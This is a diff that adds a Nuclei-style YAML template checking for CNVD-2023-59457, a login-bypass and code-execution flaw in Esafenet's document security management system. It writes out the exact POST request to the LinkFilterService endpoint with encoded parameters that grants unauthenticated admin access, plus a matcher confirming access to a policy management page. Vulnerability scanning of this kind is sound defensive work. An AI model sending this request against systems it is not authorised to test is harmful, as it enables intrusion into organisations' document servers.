@@ -1,0 +1,35 @@
+id: CNVD-2023-59457
+
+info:
+  name: 亿赛通电子文档安全管理系统 LinkFilterService 远程代码执行漏洞
+  author: SleepingBag945
+  severity: critical
+  description: |
+    亿赛通电子文档安全管理系统的身份验证机制存在缺陷，可能允许未授权用户通过绕过标准登录流程来获取后台访问权限。此外，在处理特定数据输入时，存在漏洞可能导致不安全的代码执行，增加了系统安全性的风险。
+  remediation: 官方已发布安全修复版本，请及时联系官方客服升级至官网最新版本
+  reference:
+    - https://stack.chaitin.com/vuldb/detail/49323d29-68eb-4fe9-ba5a-b8eb13345de0
+
+http:
+  - raw:
+    - |
+      POST /CDGServer3//LinkFilterService HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      path=BOFGGPFBFIFPBHFMGKGI&userId=GCGHGAGGFAFHFGFCFEFPFD&cur=DBNJOADCFBOPECMNBCOHMDMDKGCMMLFFCJCACB
+
+    - |
+      GET /CDGServer3/sip-jsp/dlp-policy/dlpPolicyManage.jsp HTTP/1.1
+      Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - 'dlpPolicyGrid'
+      - type: word
+        part: header_1
+        words:
+          - 'frame.jsp'
